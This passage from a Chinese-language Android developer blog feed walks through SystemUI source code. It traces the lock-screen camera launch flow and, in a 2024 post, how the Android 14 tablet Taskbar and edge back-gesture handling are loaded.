(CentralSurfaces.DEBUG_CAMERA_LIFT) &#123;</span><br><span class="line">                Slog.d(CentralSurfaces.TAG, <span class="string">&quot;Deferring until screen turns on&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            mCentralSurfaces.setLaunchCameraOnFinishedWaking(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看 <strong>NotificationPanelViewController#launchCamera()</strong> :<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/shade/NotificationPanelViewController.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">launchCamera</span><span class="params">(<span class="type">boolean</span> animate, <span class="type">int</span> source)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (source == StatusBarManager.CAMERA_LAUNCH_SOURCE_POWER_DOUBLE_TAP) &#123;</span><br><span class="line">        mLastCameraLaunchSource = KeyguardBottomAreaView.CAMERA_LAUNCH_SOURCE_POWER_DOUBLE_TAP;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (source == StatusBarManager.CAMERA_LAUNCH_SOURCE_WIGGLE) &#123;</span><br><span class="line">        mLastCameraLaunchSource = KeyguardBottomAreaView.CAMERA_LAUNCH_SOURCE_WIGGLE;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (source == StatusBarManager.CAMERA_LAUNCH_SOURCE_LIFT_TRIGGER) &#123;</span><br><span class="line">        mLastCameraLaunchSource = KeyguardBottomAreaView.CAMERA_LAUNCH_SOURCE_LIFT_TRIGGER;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Default.</span></span><br><span class="line">        mLastCameraLaunchSource = KeyguardBottomAreaView.CAMERA_LAUNCH_SOURCE_AFFORDANCE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!isFullyCollapsed()) &#123;</span><br><span class="line">        setLaunchingAffordance(<span class="literal">true</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        animate = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    mAffordanceHasPreview = mKeyguardBottomArea.getRightPreview() != <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 启动相机</span></span><br><span class="line">    mAffordanceHelper.launchAffordance(</span><br><span class="line">            animate, mView.getLayoutDirection() == View.LAYOUT_DIRECTION_RTL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着看 <strong>KeyguardAffordanceHelper#launchAffordance()</strong> :</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">launchAffordance</span><span class="params">(<span class="type">boolean</span> animate, <span class="type">boolean</span> left)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (mSwipingInProgress) &#123;</span><br><span class="line">        <span class="comment">// We don&#x27;t want to mess with the state if the user is actually swiping already.</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">KeyguardAffordanceView</span> <span class="variable">targetView</span> <span class="operator">=</span> left ? mLeftIcon : mRightIcon;</span><br><span class="line">    <span class="type">KeyguardAffordanceView</span> <span class="variable">otherView</span> <span class="operator">=</span> left ? mRightIcon : mLeftIcon;</span><br><span class="line">    startSwiping(targetView);</span><br><span class="line">    <span class="comment">// Do not animate the circle expanding if the affordance isn&#x27;t visible,</span></span><br><span class="line">    <span class="comment">// otherwise the circle will be meaningless.</span></span><br><span class="line">    <span class="keyword">if</span> (targetView.getVisibility() != View.VISIBLE) &#123;</span><br><span class="line">        animate = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (animate) &#123;</span><br><span class="line">        fling(<span class="number">0</span>, <span class="literal">false</span>, !left);  <span class="comment">// 这里面会回调 KeyguardAffordanceHelperCallback#onAnimationToSideStarted() 方法，去启动相机，并且里面有个动画。</span></span><br><span class="line">        updateIcon(otherView, <span class="number">0.0f</span>, <span class="number">0</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        mCallback.onAnimationToSideStarted(!left, mTranslation, <span class="number">0</span>);</span><br><span class="line">        mTranslation = left ? mCallback.getMaxTranslationDistance()</span><br><span class="line">                : mCallback.getMaxTranslationDistance();</span><br><span class="line">        updateIcon(otherView, <span class="number">0.0f</span>, <span class="number">0.0f</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">        targetView.instantFinishAnimation();</span><br><span class="line">        mFlingEndListener.onAnimationEnd(<span class="literal">null</span>);</span><br><span class="line">        mAnimationEndRunnable.run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当动画执行完成，则会执行 mAnimationEndRunnable.run()，进而回调到： <strong>KeyguardAffordanceHelperCallback#onAnimationToSideEnded()</strong> ： 方法里</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onAnimationToSideEnded</span><span class="params">()</span> &#123;</span><br><span class="line">    mIsLaunchTransitionRunning = <span class="literal">false</span>;</span><br><span class="line">    mIsLaunchTransitionFinished = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (mLaunchAnimationEndRunnable != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 这里会去销毁密码锁界面、图案锁界面；</span></span><br><span class="line">        mLaunchAnimationEndRunnable.run();</span><br><span class="line">        mLaunchAnimationEndRunnable = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    mCentralSurfaces.readyForKeyguardDone();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里补充个流程： 在未解锁的情况下，打开临时占用的app，比如 相机，紧急拨号等会调用如下函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setOccluded</span><span class="params">(<span class="type">boolean</span> occluded, <span class="type">boolean</span> animate)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">isOccluding</span> <span class="operator">=</span> !mOccluded &amp;&amp; occluded;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">isUnOccluding</span> <span class="operator">=</span> mOccluded &amp;&amp; !occluded;</span><br><span class="line">    setOccludedAndUpdateStates(occluded);</span><br><span class="line">    <span class="keyword">if</span> (mShowing &amp;&amp; isOccluding) &#123;</span><br><span class="line">        SysUiStatsLog.write(SysUiStatsLog.KEYGUARD_STATE_CHANGED,</span><br><span class="line">                SysUiStatsLog.KEYGUARD_STATE_CHANGED__STATE__OCCLUDED);</span><br><span class="line">        <span class="keyword">if</span> (mCentralSurfaces.isInLaunchTransition()) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Runnable</span> <span class="variable">endRunnable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="comment">///M: [ALPS01807921]</span></span><br><span class="line">                    <span class="comment">///   mOccluded may be changed before the runnable is executed.</span></span><br><span class="line">                    <span class="keyword">if</span> (mOccluded) &#123;</span><br><span class="line">                        mNotificationShadeWindowController.setKeyguardOccluded(mOccluded);</span><br><span class="line">                        reset(<span class="literal">true</span> <span class="comment">/* hideBouncerWhenShowing */</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        Log.d(TAG, <span class="string">&quot;setOccluded.run() - mOccluded was set to false&quot;</span>) ;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            </span><br><span class="line">            mCentralSurfaces.fadeKeyguardAfterLaunchTransition(</span><br><span class="line">                    <span class="literal">null</span> <span class="comment">/* beforeFading */</span>,</span><br><span class="line">                    endRunnable,</span><br><span class="line">                    endRunnable);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> SystemUI </tag>
            
            <tag> framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 14 平板Taskbar加载流程解析</title>
      <link href="/2024/02/12/2024-02-12/"/>
      <url>/2024/02/12/2024-02-12/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>从 Android 12开始，如果是大屏底下导航栏会变成显示一个任务栏，从 <strong>NavigationBar</strong> 变成 <strong>Taskbar</strong> 。</p><blockquote><p>注：<strong>CentralSurfacesImpl.java</strong> 与 原来的 <strong>statusbar.java</strong> 的作用一样。</p></blockquote><p><strong>CentralSurfacesImpl</strong> 的启动流程前面有说过，这里不在说明。</p><p><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/CentralSurfacesImpl.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CentralSurfacesImpl</span> <span class="keyword">extends</span> <span class="title class_">CoreStartable</span> <span class="keyword">implements</span></span><br><span class="line">        <span class="title class_">CentralSurfaces</span> &#123;</span><br><span class="line"></span><br><span class="line">     <span class="comment">//省略其他代码....</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">makeStatusBarView</span><span class="params">(<span class="meta">@Nullable</span> RegisterStatusBarResult result)</span> &#123;</span><br><span class="line">        <span class="comment">//省略其他代码....</span></span><br><span class="line">        createNavigationBar(result);</span><br><span class="line">       <span class="comment">//省略其他代码....</span></span><br><span class="line">  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">createNavigationBar</span><span class="params">(<span class="meta">@Nullable</span> RegisterStatusBarResult result)</span> &#123;</span><br><span class="line">        <span class="comment">// 调用 NavigationBarController 的 createNavigationBars()方法创建 NavigationBar</span></span><br><span class="line">        mNavigationBarController.createNavigationBars(<span class="literal">true</span> <span class="comment">/* includeDefaultDisplay */</span>, result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着往下看：<br><strong>NavigationBarController#createNavigationBars()</strong><br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/navigationbar/NavigationBarController.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createNavigationBars</span><span class="params">(<span class="keyword">final</span> <span class="type">boolean</span> includeDefaultDisplay,</span></span><br><span class="line"><span class="params">        RegisterStatusBarResult result)</span> &#123;</span><br><span class="line">    <span class="comment">// 如果需要，更新辅助功能按钮模式</span></span><br><span class="line">    updateAccessibilityButtonModeIfNeeded();</span><br><span class="line">    <span class="comment">// 这里是重点，Android 12 之前版本的，没有这个判断。可以看下 initializeTaskbarIfNecessary() 方法。</span></span><br><span class="line">    <span class="comment">// 如果我们初始化TaskBar，则不需要在默认显示上创建导航栏</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">shouldCreateDefaultNavbar</span> <span class="operator">=</span> includeDefaultDisplay</span><br><span class="line">            &amp;&amp; !initializeTaskbarIfNecessary();</span><br><span class="line">    Display[] displays = mDisplayManager.getDisplays();</span><br><span class="line">    <span class="keyword">for</span> (Display display : displays) &#123;</span><br><span class="line">        <span class="keyword">if</span> (shouldCreateDefaultNavbar || display.getDisplayId() != DEFAULT_DISPLAY) &#123;</span><br><span class="line">            createNavigationBar(display, <span class="literal">null</span> <span class="comment">/* savedState */</span>, result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** <span class="doctag">@return</span> &#123;<span class="doctag">@code</span> true&#125; if taskbar is enabled, false otherwise */</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">initializeTaskbarIfNecessary</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 这里会判断是否是平板。</span></span><br><span class="line">    <span class="comment">// 跟踪代码发现，如果屏幕的（最小边长度*160/dpi值）&lt; 600，就会判断为设备是平板设备</span></span><br><span class="line">    <span class="comment">// system/vendor/mediatek/proprietary/packages/apps/SystemUI/shared/src/com/android/systemui/shared/recents/utilities/Utilities.java</span></span><br><span class="line">    <span class="comment">// Enable for large screens or (phone AND flag is set); assuming phone = !mIsLargeScreen</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">taskbarEnabled</span> <span class="operator">=</span> (mIsLargeScreen || mFeatureFlags.isEnabled(</span><br><span class="line">            Flags.HIDE_NAVBAR_WINDOW)) &amp;&amp; shouldCreateNavBarAndTaskBar(mContext.getDisplayId());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (taskbarEnabled) &#123;</span><br><span class="line">        Trace.beginSection(<span class="string">&quot;NavigationBarController#initializeTaskbarIfNecessary&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">displayId</span> <span class="operator">=</span> mContext.getDisplayId();</span><br><span class="line">        <span class="comment">// Hint to NavBarHelper if we are replacing an existing bar to skip extra work</span></span><br><span class="line">        mNavBarHelper.setTogglingNavbarTaskbar(mNavigationBars.contains(displayId));</span><br><span class="line">        <span class="comment">// Remove navigation bar when taskbar is showing</span></span><br><span class="line">        <span class="comment">// 移除导航栏</span></span><br><span class="line">        removeNavigationBar(displayId);</span><br><span class="line">        <span class="comment">// 加载任务栏</span></span><br><span class="line">        mTaskbarDelegate.init(displayId);</span><br><span class="line">        mNavBarHelper.setTogglingNavbarTaskbar(<span class="literal">false</span>);</span><br><span class="line">        Trace.endSection();</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        mTaskbarDelegate.destroy();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> taskbarEnabled;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们分析平板，所以这里直接看  <strong>mTaskbarDelegate.init(mContext.getDisplayId())</strong> 方法；<br><strong>TaskbarDelegate#init()</strong><br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/navigationbar/TaskbarDelegate.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(<span class="type">int</span> displayId)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (mInitialized) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略其他代码....</span></span><br><span class="line">    <span class="comment">// 注册监听，切换导航模式时接收回调。</span></span><br><span class="line">    mEdgeBackGestureHandler.onNavigationModeChanged(</span><br><span class="line">            mNavigationModeController.addListener(<span class="built_in">this</span>));</span><br><span class="line">    <span class="comment">// 边缘手势处理，注意：这里只加载、处理手势。</span></span><br><span class="line">    <span class="comment">// 手势中左右两返回图标由这里加载，底部黑色小横条不在这里加载。</span></span><br><span class="line">    mEdgeBackGestureHandler.onNavBarAttached();</span><br><span class="line">    <span class="comment">//省略其他代码....</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 导航模式改变回调，进行处理</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onNavigationModeChanged</span><span class="params">(<span class="type">int</span> mode)</span> &#123;</span><br><span class="line">    mNavigationMode = mode;</span><br><span class="line">    mEdgeBackGestureHandler.onNavigationModeChanged(mode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-手势加载"><a href="#1-手势加载" class="headerlink" title="1. 手势加载"></a>1. 手势加载</h4><p><strong>EdgeBackGestureHandler#onNavBarAttached()</strong><br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/navigationbar/gestural/EdgeBackGestureHandler.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> NavigationBarView#onAttachedToWindow()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onNavBarAttached</span><span class="params">()</span> &#123;</span><br><span class="line">    mIsAttached = <span class="literal">true</span>;</span><br><span class="line">    mProtoTracer.add(<span class="built_in">this</span>);</span><br><span class="line">    mOverviewProxyService.addCallback(mQuickSwitchListener);</span><br><span class="line">    mSysUiState.addCallback(mSysUiStateCallback);</span><br><span class="line">    <span class="comment">// 重点关注这里，更新视图</span></span><br><span class="line">    updateIsEnabled();</span><br><span class="line">    startTracking();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">updateIsEnabled</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// mIsAttached 是否已经添加上了，mIsGesturalModeEnabled 是否启用手势模式</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isEnabled</span> <span class="operator">=</span> mIsAttached &amp;&amp; mIsGesturalModeEnabled;</span><br><span class="line">    <span class="keyword">if</span> (isEnabled == mIsEnabled) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    mIsEnabled = isEnabled;</span><br><span class="line">    <span class="comment">// 如果无效的话结束监听 Input</span></span><br><span class="line">    disposeInputChannel();</span><br><span class="line">    <span class="keyword">if</span> (mEdgeBackPlugin != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 边缘导航栏销毁</span></span><br><span class="line">        mEdgeBackPlugin.onDestroy();</span><br><span class="line">        mEdgeBackPlugin = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 是否启用手势模式</span></span><br><span class="line">    <span class="keyword">if</span> (!mIsEnabled) &#123;</span><br><span class="line">            <span class="comment">// 注销监听返回手势参数的设置变化</span></span><br><span class="line">        mGestureNavigationSettingsObserver.unregister();</span><br><span class="line">        <span class="keyword">if</span> (DEBUG_MISSING_GESTURE) &#123;</span><br><span class="line">            Log.d(DEBUG_MISSING_GESTURE_TAG, <span class="string">&quot;Unregister display listener&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        mPluginManager.removePluginListener(<span class="built_in">this</span>);</span><br><span class="line">        TaskStackChangeListeners.getInstance().unregisterTaskStackListener(mTaskStackListener);</span><br><span class="line">        DeviceConfig.removeOnPropertiesChangedListener(mOnPropertiesChangedListener);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 注销 WMS 里保存的除外区域监听</span></span><br><span class="line">            mWindowManagerService.unregisterSystemGestureExclusionListener(</span><br><span class="line">                    mGestureExclusionListener, mDisplayId);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException | IllegalArgumentException e) &#123;</span><br><span class="line">            Log.e(TAG, <span class="string">&quot;Failed to unregister window manager callbacks&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 监听返回手势参数的设置变化</span></span><br><span class="line">        mGestureNavigationSettingsObserver.register();</span><br><span class="line">        updateDisplaySize();</span><br><span class="line">        <span class="keyword">if</span> (DEBUG_MISSING_GESTURE) &#123;</span><br><span class="line">            Log.d(DEBUG_MISSING_GESTURE_TAG, <span class="string">&quot;Register display listener&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        TaskStackChangeListeners.getInstance().registerTaskStackListener(mTaskStackListener);</span><br><span class="line">        DeviceConfig.addOnPropertiesChangedListener(DeviceConfig.NAMESPACE_SYSTEMUI,</span><br><span class="line">                mMainExecutor::execute, mOnPropertiesChangedListener);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 监听 WMS 里保存的除外区域</span></span><br><span class="line">            mWindowManagerService.registerSystemGestureExclusionListener(</span><br><span class="line">                    mGestureExclusionListener, mDisplayId);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException | IllegalArgumentException e) &#123;</span><br><span class="line">            Log.e(TAG, <span class="string">&quot;Failed to register window manager callbacks&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//  注册名为 edge-swipe 的InputMonitor</span></span><br><span class="line">        mInputMonitor = InputManager.getInstance().monitorGestureInput(</span><br><span class="line">                <span class="string">&quot;edge-swipe&quot;</span>, mDisplayId);</span><br><span class="line">        mInputEventReceiver = <span class="keyword">new</span> <span class="title class_">InputChannelCompat</span>.InputEventReceiver(</span><br><span class="line">                mInputMonitor.getInputChannel(), Looper.getMainLooper(),</span><br><span class="line">                Choreographer.getInstance(), <span class="built_in">this</span>::onInputEvent);</span><br><span class="line">        <span class="comment">// 添加 NavigationBarEdgePanel 为 Edge Back 事件的处理实现</span></span><br><span class="line">        setEdgeBackPlugin(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">NavigationBarEdgePanel</span>(mContext, mBackAnimation, mLatencyTracker));</span><br><span class="line">        mPluginManager.addPluginListener(</span><br><span class="line">                <span class="built_in">this</span>, NavigationEdgeBackPlugin.class, <span class="comment">/*allowMultiple=*/</span> <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 更新 ML 模型资源.</span></span><br><span class="line">    updateMLModelState();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建返回手势视图</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">setEdgeBackPlugin</span><span class="params">(NavigationEdgeBackPlugin edgeBackPlugin)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Trace.beginSection(<span class="string">&quot;setEdgeBackPlugin&quot;</span>);</span><br><span class="line">        <span class="comment">// 缓存 NavigationEdgeBackPlugin 实现</span></span><br><span class="line">        mEdgeBackPlugin = edgeBackPlugin;</span><br><span class="line">        <span class="comment">// 向 NavigationEdgeBackPlugin 注册 Back 手势的触发回调</span></span><br><span class="line">        mEdgeBackPlugin.setBackCallback(mBackCallback);</span><br><span class="line">        <span class="comment">// 准备好手势视图的 Window 参数</span></span><br><span class="line">        mEdgeBackPlugin.setLayoutParams(createLayoutParams());</span><br><span class="line">        updateDisplaySize();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        Trace.endSection();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 